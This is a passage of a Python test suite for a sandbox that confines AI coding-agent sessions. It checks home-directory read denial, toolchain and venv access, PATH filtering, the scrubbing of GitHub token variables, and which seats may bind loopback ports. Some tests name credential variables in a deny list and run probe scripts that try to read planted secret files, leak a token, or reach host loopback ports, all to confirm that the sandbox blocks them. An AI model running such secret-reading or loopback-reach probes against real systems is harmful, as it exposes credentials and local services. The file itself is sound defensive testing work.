    run, _, _ = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import os, pathlib
        home = pathlib.Path(os.environ["HOME"])
        (home / ".cache" / "pip").mkdir(parents=True, exist_ok=True)
        (home / ".cache" / "pip" / "x").write_text("cache")
        pathlib.Path(os.environ["TMPDIR"], "scratch").write_text("tmp")
        print("written", flush=True)
        """
    )
    proc = run_sandboxed(
        _child(script, []), run.root, run.settings_path, timeout=60
    )
    assert "written" in proc.stdout, proc.stdout + proc.stderr
    status = subprocess.run(
        ["git", "-C", str(run.root), "status", "--porcelain"],
        check=True, capture_output=True, text=True,
    ).stdout
    assert status == "", f"scratch files appear as untracked:\n{status}"


def test_timeout_preserves_partial_output(tmp_path: Path):
    """When a detached pipe-holder forces the pipes closed, whatever the
    leader already wrote must survive — not be discarded."""
    run, _, _ = _make_run(tmp_path)
    script = textwrap.dedent(
        """
        import subprocess, sys, time
        print("BEFORE-DETACH-MARKER", flush=True)
        subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(60)"],
            start_new_session=True,
        )
        time.sleep(60)
        """
    )
    with pytest.raises(subprocess.TimeoutExpired) as excinfo:
        run_sandboxed(_child(script, []), run.root, run.settings_path, timeout=3)
    output = excinfo.value.output or ""
    assert "BEFORE-DETACH-MARKER" in output, (
        f"partial output discarded on force-close: {output!r}"
    )


# --- review round 5 ----------------------------------------------------------


def test_toolchain_symlink_under_home_executes(tmp_path: Path, monkeypatch):
    """The native Claude Code install is a symlink under $HOME
    (~/.local/bin/claude -> ~/.local/share/claude/versions/X). Exec through
    the link — directly and via a PATH lookup — must work, not just through
    the resolved path: F-06 finds the CLI by name.

    HOME is a per-test fake (see test_toolchain_under_home_is_executable):
    same deny/allow semantics, no fixed path in the real home to race
    parallel workers."""
    home = tmp_path / "home"
    base = home / ".factory-sandbox-tc-r5"
    link_dir = base / "bin"
    real_dir = base / "share" / "tool" / "versions" / "1.0"
    real_dir.mkdir(parents=True)
    link_dir.mkdir(parents=True)
    real = real_dir / "r5tool"
    real.write_text("#!/bin/sh\necho 'r5 symlink ok'\n")
    real.chmod(0o755)
    link = link_dir / "r5tool"
    link.symlink_to(Path("..") / "share" / "tool" / "versions" / "1.0" / "r5tool")
    run, _, _ = _make_run(tmp_path)
    monkeypatch.setenv("HOME", str(home))
    settings = build_settings({}, run.root, model_endpoint=MODEL_ENDPOINT,
                              toolchain=[link])
    write_settings(settings, run.settings_path)
    via_link = run_sandboxed([str(link)], run.root, run.settings_path, timeout=60)
    assert "r5 symlink ok" in via_link.stdout, (
        f"exec via the symlink failed: rc={via_link.returncode}\n"
        f"{via_link.stdout}{via_link.stderr}"
    )
    via_path = run_sandboxed(
        ["r5tool"], run.root, run.settings_path, timeout=60,
        env={"PATH": f"{link_dir}{os.pathsep}{os.environ['PATH']}"},
    )
    assert "r5 symlink ok" in via_path.stdout, (
        f"PATH lookup of the symlinked tool failed: rc={via_path.returncode}\n"
        f"{via_path.stdout}{via_path.stderr}"
    )
    # Only the link file itself is re-allowed, never its directory.
    allow = settings["filesystem"]["allowRead"]
    assert str(link) in allow and str(link_dir) not in allow


def test_bin_dir_parent_never_reopens_a_shared_prefix():
    """A binary living in ~/.local/bin must not re-allow all of ~/.local
    (uv credentials, cursor-agent, ... under ~/.local/share). For a bin/ dir
    only its sibling lib/ (where an interpreter's stdlib and site-packages
    live) joins the reads, never the whole parent."""
    home = Path.home()
    real = home.resolve()
    reads = _toolchain_allowread(home, [home / ".local" / "bin" / "sometool"])
    assert home / ".local" not in reads and real / ".local" not in reads, reads
    assert reads == {real / ".local" / "bin", real / ".local" / "lib"}


def test_run_sandboxed_docstring_matches_the_select_pump():
    """The teardown is a single-threaded select loop; the docstring must not
    describe the abandoned reader-thread design."""
    doc = run_sandboxed.__doc__ or ""
    assert "reader thread" not in doc.lower(), "docstring still describes reader threads"
    assert "select" in doc


# --- review follow-ups (fresh-context review of d898f10) ------------------


@pytestmark_nested
def test_settings_backstop_denies_every_github_name_in_the_environment(
    tmp_path: Path, monkeypatch
):
    """F1: scrub_env drops the whole GH_/GITHUB_ prefix, but srt's
    credentials.envVars deny takes exact names only. The backstop must name
    every GitHub-prefixed variable actually present when settings are built
    (plus well-known token names), or a scrub-bypassing caller leaks e.g. a
    GH_APP_TOKEN while GH_TOKEN is stripped."""
    monkeypatch.setenv("GH_APP_TOKEN", "prefix-leak")
    monkeypatch.setenv("GITHUB_PAT_EXTRA", "prefix-leak-2")
    run, _, _ = _make_run(tmp_path)
    settings = json.loads(run.settings_path.read_text())
    denied = {e["name"] for e in settings["credentials"]["envVars"]}
    assert {"GH_APP_TOKEN", "GITHUB_PAT_EXTRA", "GH_TOKEN", "GITHUB_TOKEN"} <= denied

    script = "import os; print('GH_APP_TOKEN=' + repr(os.environ.get('GH_APP_TOKEN')))"
    proc = subprocess.run(
        [str(srt_bin()), "--settings", str(run.settings_path), "-c",
         shlex.join(_child(script, []))],
        env=dict(os.environ), cwd=run.root, capture_output=True, text=True,
        timeout=60,
    )
    assert "GH_APP_TOKEN=None" in proc.stdout, (
        f"settings backstop let a GH_-prefixed secret through\n{proc.stdout}{proc.stderr}"
    )


def test_warm_cache_symlinks_are_preserved_not_followed(tmp_path: Path):
    """F2: prebuilt venvs and node_modules are full of symlinks. A dangling
    or circular link must not abort the run, links stay links (a venv's
    bin/python is not copied as a 6MB file), and an absolute link pointing
    into the cache is retargeted into the run (the cache may be unreadable
    inside the sandbox)."""
    cache = tmp_path / "warm-cache"
    (cache / "node_modules" / "a").mkdir(parents=True)
    (cache / "node_modules" / "a" / "index.js").write_text("module.exports = 1\n")
    os.symlink("/nonexistent/target", cache / "node_modules" / "dangling")
    os.symlink("..", cache / "node_modules" / "a" / "self")  # pnpm-style cycle
    os.symlink(cache / "node_modules" / "a" / "index.js", cache / "node_modules" / "abs")
    (cache / ".venv" / "bin").mkdir(parents=True)
    (cache / ".venv" / "pyvenv.cfg").write_text("home = /usr/bin\n")
    real_python = Path(os.path.realpath(sys.executable))
    os.symlink(real_python, cache / ".venv" / "bin" / "python")

    run = create_run(
        "fixture", _fixture_repo(tmp_path), factory_root=_factory_root(tmp_path),
        warm_cache=cache,
    )
    nm = run.root / "node_modules"
    assert (nm / "dangling").is_symlink()
    assert (nm / "a" / "self").is_symlink()
    py = run.root / ".venv" / "bin" / "python"
    assert py.is_symlink() and Path(os.readlink(py)) == real_python, (
        "venv interpreter symlink was dereferenced into a copy"
    )
    assert Path(os.readlink(nm / "abs")) == nm / "a" / "index.js", (
        "absolute link into the cache still points at the cache"
    )


def test_python_toolchain_follows_shims_to_the_real_interpreter(tmp_path: Path, monkeypatch):
    """P3: pyenv puts a bash *script* named python3 on PATH, not a symlink,
    so shutil.which() alone names the shim. The toolchain must allow the real
    interpreter the shim runs (asked via sys.executable), so a $HOME-based
    pyenv/uv python stays executable inside the sandbox."""
    from factory.sandbox import _python_toolchain
    shim_dir = tmp_path / "shims"
    shim_dir.mkdir()
    shim = shim_dir / "python3"
    shim.write_text(f'#!/bin/sh\nexec "{sys.executable}" "$@"\n')
    shim.chmod(0o755)
    monkeypatch.setenv("PATH", f"{shim_dir}{os.pathsep}{os.environ['PATH']}")
    _python_toolchain.cache_clear()
    found = _python_toolchain()
    assert Path(os.path.realpath(sys.executable)) in found, found
    assert shim not in found, "the shim script itself must not stand in for python"


# --- rehearsal blocker (JobFinderOS readiness, 2026-10-18) --------------------


def test_rehearsal_ambient_path_drops_home_entries(tmp_path, monkeypatch):
    """The sandbox denies reads under $HOME, but the ambient PATH starts
    with home dirs (~/.local/bin, ~/.pyenv/shims, ...). A PATH search that
    probes a denied dir first fails with EPERM (npm's lifecycle spawn died
    this way). Inherited PATH entries under home, or literal `~`, are
    dropped; the rest keep their order."""
    home = str(Path.home())
    monkeypatch.setenv(
        "PATH", f"{home}/.local/bin:~/.npm-global/bin:/usr/local/bin:{home}/bin:/usr/bin:/bin"
    )
    env = sandbox_env(tmp_path / "run")
    assert env["PATH"] == "/usr/local/bin:/usr/bin:/bin"


def test_rehearsal_sandboxed_child_sees_no_home_path_entries(tmp_path, monkeypatch):
    """End to end: the PATH a real sandboxed child sees has no DENIED home
    dir. A home entry survives the filter only as a dir build_settings
    re-allows for reading — the repo venv's bin, since the venv
    interpreter is toolchain (the F-31 fix); the planted ~/.local/bin
    (not re-allowed) must be dropped."""
    home = str(Path.home())
    monkeypatch.setenv("PATH", f"{home}/.local/bin:{os.environ['PATH']}")
    run, _, settings = _make_run(tmp_path)
    proc = run_sandboxed(
        _child("import os; print('PATH=' + os.environ['PATH'])", []),
        run.root, run.settings_path, timeout=60,
    )
    line = next(ln for ln in proc.stdout.splitlines() if ln.startswith("PATH="))
    entries = line[len("PATH="):].split(":")
    assert entries, line
    assert f"{home}/.local/bin" not in entries, line
    allowed = {Path(p) for p in settings["filesystem"]["allowRead"]}
    survivors = [e for e in entries if e.startswith(home) or e.startswith("~")]
    assert all(
        Path(e) in allowed or Path(e).resolve() in allowed for e in survivors
    ), f"PATH kept a home entry the sandbox denies reading: {line}"


# --- the F-31 venv incident: a home venv interpreter must stay a venv -------


def test_toolchain_allowread_covers_a_home_venv_exactly(tmp_path: Path):
    """Run 20261029T130912Z-1e4eb9: a venv python under the denied home
    resolves to its base install, so the toolchain allowread covered only
    the base — inside the sandbox Python started WITHOUT the venv
    (pyvenv.cfg unreadable, sys.prefix collapsed to the base) and the
    session entry died on ModuleNotFoundError. The venv's own
    pyvenv.cfg, bin/ and lib*/python*/site-packages must be re-allowed;
    the venv directory itself, its parent (the repo it lives in) and
    everything else in the home must not be."""
    home = tmp_path / "home"
    venv = home / "proj" / ".venv"
    (venv / "bin").mkdir(parents=True)
    (venv / "pyvenv.cfg").write_text("home = /usr/local/bin\n")
    site = venv / "lib" / "python3.11" / "site-packages"
    site.mkdir(parents=True)
    python = venv / "bin" / "python"
    python.symlink_to(sys.executable)  # the base interpreter, outside this home

    allowed = _toolchain_allowread(home, [python])

    assert venv / "pyvenv.cfg" in allowed
    assert venv / "bin" in allowed
    assert site in allowed
    assert venv not in allowed             # never the venv dir itself
    assert venv.parent not in allowed      # never the repo around it
    assert home / "proj" not in allowed
    assert all(entry != home for entry in allowed)


def test_a_venv_interpreter_imports_from_its_own_site_packages(
        tmp_path: Path, monkeypatch):
    """End to end under the real sandbox: the venv lives under a denied
    home, its interpreter must still start as the venv (pyvenv.cfg
    readable) and import a package from its own site-packages — while
    the venv's parent directory and a sibling secret in that home stay
    unreadable. Never touches the real SDK or a real token: the package
    is a dummy planted in the throwaway venv."""
    import venv as venv_module

    home = tmp_path / "home"
    proj = home / "proj"
    venv_dir = proj / ".venv"
    venv_module.create(venv_dir, with_pip=False)
    site = (
        venv_dir / "lib"
        / f"python{sys.version_info.major}.{sys.version_info.minor}"
        / "site-packages"
    )
    dummy = site / "dummy_pkg"
    dummy.mkdir(parents=True)
    (dummy / "__init__.py").write_text("MARKER = 'venv-site'\n")
    (proj / "repo-secret.txt").write_text("checkout secret\n")
    (home / "home-secret.txt").write_text("home secret\n")
    monkeypatch.setenv("HOME", str(home))

    # Canonical runs layout so build_settings derives the factory root.
    run_dir = tmp_path / "factory-root" / "runs" / "fixture" / "probe-run"
    run_dir.mkdir(parents=True)
    settings = build_settings(
        {"docs_allowlist": [], "network_allowlist": []},
        run_dir,
        model_endpoint=MODEL_ENDPOINT,
        toolchain=[venv_dir / "bin" / "python"],
    )
    settings_path = run_dir / "settings.json"
    write_settings(settings, settings_path)

    script = textwrap.dedent(
        """
        import sys

        def attempt(label, fn):
            try:
                fn()
                print(f"{label}:ok", flush=True)
            except Exception as exc:
                print(f"{label}:denied {type(exc).__name__}", flush=True)

        import dummy_pkg
        print("import:" + dummy_pkg.MARKER, flush=True)
        print("is_venv:" + str(sys.prefix != sys.base_prefix), flush=True)
        attempt("parent", lambda: open(sys.argv[1]).read())
        attempt("home_sibling", lambda: open(sys.argv[2]).read())
        """
    )
    proc = run_sandboxed(
        [str(venv_dir / "bin" / "python"), "-c", script,
         str(proj / "repo-secret.txt"), str(home / "home-secret.txt")],
        run_dir,
        settings_path,
        timeout=120,
    )
    outcomes = dict(
        line.split(":", 1) for line in proc.stdout.splitlines() if ":" in line
    )
    assert outcomes.get("import") == "venv-site", proc.stdout + proc.stderr
    assert outcomes.get("is_venv") == "True", (
        "the interpreter started as its base, not the venv — pyvenv.cfg "
        f"unreadable\n{proc.stdout}{proc.stderr}"
    )
    assert outcomes.get("parent", "missing").startswith("denied"), (
        f"the venv's parent (the repo) was readable\n{proc.stdout}{proc.stderr}"
    )
    assert outcomes.get("home_sibling", "missing").startswith("denied"), (
        f"a sibling file in the denied home was readable\n"
        f"{proc.stdout}{proc.stderr}"
    )


# --- F-31 run blocker: sandbox.allow_local_binding, GATE RUNNER only ---------
#
# F-31's dashboard tests bind 127.0.0.1 in the gate sandbox and every bind
# died at EPERM (Errno 1) — srt's Seatbelt profile denies network-bind by
# default. The pinned srt supports network.allowLocalBinding, but its macOS
# rules grant more than loopback binds: bind on ANY interface, inbound from
# ANY origin, and outbound connect to every host loopback port (DevTools
# ports of a logged-in browser, local databases, dev and MCP servers). So
# the profile opt-in is scoped to the gate runner's settings alone (review
# decision on #76): gate commands run the project's fixed commands after
# L0's diff policy, while the implementer/reviewer sessions (and the
# importer, which is a reviewer seat) run model-written code with a
# model-chosen goal — they never get the reach, whatever the profile says.


def test_allow_local_binding_is_absent_by_default(tmp_path: Path):
    """The opt-in is deny-by-default: a profile that says nothing must
    produce settings whose network block carries NO allowLocalBinding key
    (absent, not false — srt treats the key's presence as its own signal),
    gate or session alike."""
    run, _, _ = _make_run(tmp_path)
    settings = build_settings({}, run.root, model_endpoint=MODEL_ENDPOINT)
    assert "allowLocalBinding" not in settings["network"], settings["network"]


def test_local_binding_needs_the_explicit_gate_request(tmp_path: Path):
    """The profile opt-in alone is NOT enough — that is the whole review
    decision. The session seats (implementer, reviewer, the importer's
    reviewer seat, the SDK probe) call build_settings without
    ``local_binding``; with the profile opted in their settings must still
    carry no key. Only the explicit request (the gate path, _gate_settings)
    turns the opt-in into srt's allowLocalBinding."""
    run, _, _ = _make_run(tmp_path)
    opted_in = {"sandbox": {"allow_local_binding": True}}

    # the session shape: exactly how factory/session.py calls it
    settings = build_settings(opted_in, run.root, model_endpoint=MODEL_ENDPOINT)
    assert "allowLocalBinding" not in settings["network"], (
        "a session seat would get host-loopback reach from the profile alone"
    )

    # the gate shape: the explicit request the opt-in authorizes
    settings = build_settings(opted_in, run.root, model_endpoint=MODEL_ENDPOINT,
                              local_binding=True)
    assert settings["network"]["allowLocalBinding"] is True

    # the request without the opt-in grants nothing, and the other
    # spellings must not smuggle the key in either way
    for profile in ({"sandbox": {"allow_local_binding": False}},
                    {"sandbox": {}},
                    {"allow_local_binding": True}):
        for kwargs in ({}, {"local_binding": True}):
            settings = build_settings(profile, run.root,
                                      model_endpoint=MODEL_ENDPOINT, **kwargs)
            assert "allowLocalBinding" not in settings["network"], (profile, kwargs)


def test_session_and_importer_sources_never_request_local_binding():
    """A mechanical tripwire on the review decision: the session module
    (every session seat, the importer's reviewer seat included) must never
    pass local_binding, whatever the profile says. The seats run
    model-written code with a model-chosen goal; host-loopback reach
    (browsers' DevTools ports, databases, dev/MCP servers) is the gate
    runner's alone."""
    for name in ("factory/session.py", "factory/importer.py"):
        source = (REPO_ROOT / name).read_text()
        assert "local_binding" not in source, (
            f"{name} requests local binding — session seats must never get "
            "it (review decision on #76); see test_local_binding_needs_the_"
            "explicit_gate_request"
        )


def test_gate_settings_carry_allow_local_binding(tmp_path: Path):
    """The gate runner is the seat that lost F-31: _gate_settings feeds the
    L0/L1 commands' sandbox (the stale-base re-validation clone uses the
    same settings), so the profile opt-in must survive that path — and
    ONLY that path (review decision on #76)."""
    import factory.orchestrator as orch
    from factory.runs import RunDir

    run, root, _ = _make_run(tmp_path)
    clean = RunDir(project="fixture", run_id=run.root.name, root=run.root,
                   settings_path=run.settings_path)
    orch._gate_settings(
        {"sandbox": {"allow_local_binding": True}}, clean, root
    )
    gate_settings = json.loads(run.settings_path.read_text())
    assert gate_settings["network"]["allowLocalBinding"] is True

    # and the gate grants nothing without the opt-in
    orch._gate_settings({"sandbox": {"allow_local_binding": False}}, clean, root)
    gate_settings = json.loads(run.settings_path.read_text())
    assert "allowLocalBinding" not in gate_settings["network"]


_BIND_CONNECT_SCRIPT = textwrap.dedent(
    """
    import socket, sys
    port = int(sys.argv[1])
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        srv.bind(("127.0.0.1", 0))
        print("bind:ok", flush=True)
    except PermissionError as exc:
        print(f"bind:EPERM {exc.errno}", flush=True)
    srv.close()
    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cli.settimeout(10)
    try:
        cli.connect(("127.0.0.1", port))
        print("conn:ok", flush=True)
    except PermissionError as exc:
        print(f"conn:EPERM {exc.errno}", flush=True)
    except OSError as exc:
        print(f"conn:{type(exc).__name__} {exc.errno}", flush=True)
    """
)


def test_local_binding_session_denied_gate_allowed_real_srt(tmp_path: Path):
    """The real-srt proof of the review decision, on both axes srt's
    allowLocalBinding actually grants (bind AND outbound connect to a host
    loopback port — the reach a session seat must never get):

    - session-shaped settings (factory/session.py's exact build_settings
      call, profile opted in, no local_binding): binding 127.0.0.1:0 fails
      EPERM and connecting to a HOST listener on 127.0.0.1 fails.
    - gate-shaped settings (same profile, local_binding=True — what
      _gate_settings writes): both succeed — F-31's dashboard tests bind,
      and only the gate runs them.

    The host listener is bound by the test process itself (outside the
    sandbox) and left listening on its backlog, so connect() has a real
    target: on macOS that is exactly the DevTools-port/local-database
    reach the review is withholding from sessions.

    Linux (pinned srt source): bwrap never reads allowLocalBinding — the
    sandbox is its own network namespace. Bind inside it works under both
    shapes (nothing outside can reach it), and the host listener is in
    ANOTHER namespace, so connect fails under both shapes. The test pins
    that asymmetry; macOS is where both decisions are observable."""
    import socket as _socket

    listener = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    host_port = listener.getsockname()[1]

    run, _, _ = _make_run(tmp_path)  # session-shaped: profile says nothing
    src2 = tmp_path / "src2"
    src2.mkdir()
    root2 = tmp_path / "root2"
    gate_run = create_run("fixture", _fixture_repo(src2), factory_root=root2)
    opted_in = {"sandbox": {"allow_local_binding": True}}
    write_settings(
        # the session shape: the profile opts in, the seat never asks —
        # exactly factory/session.py's build_settings call
        build_settings(opted_in, gate_run.root, model_endpoint=MODEL_ENDPOINT),
        gate_run.settings_path,
    )
    session_proc = run_sandboxed(
        _child(_BIND_CONNECT_SCRIPT, [str(host_port)]),
        gate_run.root, gate_run.settings_path, timeout=120,
    )

    gate_settings = build_settings(opted_in, run.root,
                                   model_endpoint=MODEL_ENDPOINT,
                                   local_binding=True)
    write_settings(gate_settings, run.settings_path)
    gate_proc = run_sandboxed(
        _child(_BIND_CONNECT_SCRIPT, [str(host_port)]),
        run.root, run.settings_path, timeout=120,
    )

    def legs(proc):
        return dict(
            line.split(":", 1) for line in proc.stdout.splitlines()
            if line.startswith(("bind:", "conn:"))
        )

    session, gate = legs(session_proc), legs(gate_proc)
    if sys.platform == "darwin":
        assert session["bind"].startswith("EPERM"), (
            f"a session seat could bind: {session}\n{session_proc.stdout}"
            f"{session_proc.stderr}"
        )
        assert session["conn"].startswith("EPERM"), (
            f"a session seat could reach a host loopback port: {session}\n"
            f"{session_proc.stdout}{session_proc.stderr}"
        )
        assert gate["bind"] == "ok", (
            f"the gate could not bind: {gate}\n{gate_proc.stdout}"
            f"{gate_proc.stderr}"
        )
        assert gate["conn"] == "ok", (
            f"the gate could not connect to the host listener: {gate}\n"
            f"{gate_proc.stdout}{gate_proc.stderr}"
        )
    else:
        # Linux netns: bind is namespace-local and works under both shapes;
        # the host listener is unreachable from inside the namespace under
        # both shapes (ECONNREFUSED — nothing answers inside the netns).
        assert session["bind"] == "ok" and gate["bind"] == "ok", (
            session, gate, session_proc.stdout, gate_proc.stdout
        )
        assert session["conn"] != "ok" and gate["conn"] != "ok", (
            "the host loopback listener must be unreachable from inside "
            f"the Linux netns: {session} / {gate}"
        )
